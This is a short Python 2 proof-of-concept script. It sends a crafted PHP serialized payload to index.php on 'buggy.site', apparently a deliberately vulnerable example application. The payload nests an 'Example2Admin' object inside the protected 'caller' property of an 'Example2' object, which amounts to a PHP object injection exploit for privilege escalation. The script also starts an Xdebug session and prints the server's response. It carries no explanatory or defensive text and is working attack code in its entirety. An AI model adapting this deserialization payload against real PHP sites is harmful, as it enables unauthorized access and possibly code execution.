#!/usr/bin/python

import requests

if __name__ == '__main__':
    data = {'data': 'a:2:{s:4:"name";s:4:"User";s:4:"z123";O:26:"Examples\\Example2\\Example2":1:{s:9:"\0*\0caller";O:31:"Examples\\Example2\\Example2Admin":0:{}}}','XDEBUG_SESSION_START': 'PHPSTORM'}
    session = requests.session()

    response = session.get('http://buggy.site:8080/index.php', params=data)

    print response.text.encode('utf-8')